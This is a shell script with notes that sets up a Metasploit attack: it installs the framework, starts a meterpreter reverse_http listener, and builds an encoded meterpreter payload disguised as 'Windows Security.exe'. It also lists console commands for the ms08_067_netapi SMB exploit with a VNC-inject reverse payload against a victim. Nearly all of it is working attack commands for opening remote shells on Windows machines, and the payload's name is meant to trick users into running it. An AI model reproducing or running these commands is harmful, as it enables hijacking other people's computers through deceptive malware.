#####################
# dwnld metasploit install script
mkdir ~/Documents/metasploit && cd ~/Documents/metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

# Ensure the file has adequate permissions to execute
sudo chmod 755 ./msfinstall
# run created "msfinstall" file as root to install Metasploit.
sudo ./msfinstall
######
#####
##### install 'screen'
sudo apt-get install screen -y
# To view current Screen sessions:
# screen -list
# To start a new Screen session
# screen
# Once inside the session, everything will be preserved — even if you close the terminal window or shut down your computer.
# The -r argument can be used to reconnect to a running Screen session.
# screen -r SESSION-NAME-HERE

read -p "what attackIP?" IP
#  create a resource script
printf 'use multi/handler\nset payload windows/meterpreter/reverse_http\nset LHOST $IP\nset LPORT 80\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n' >~/automate.rc

#  Msfconsole can now be started using the below command.
screen msfconsole -r ~/automate.rc

# to generate the Msfvenom created in this tutorial. To generate a payload using Msfvenom, type the below command into a terminal.
msfvenom --encoder cmd/powershell_base64 --payload windows/meterpreter/reverse_http LHOST=$IP LPORT=80 --arch x86 --platform win --format exe --out ~/'Windows Security.exe'

################# SEE: null-byte.wonderhowto.com/how-to/hack-like-pro-save-world-from-nuclear-annihilation-0146216/
msf >use exploit/windows/smb/ms08_067_netapi
# VNC SERVER PAYLOAD
msf >set PAYLOAD payload/windows/vncinject/reverse_tcp
# set the RHOST (victim's) and LHOST (our) IP addresses
msf >exploit
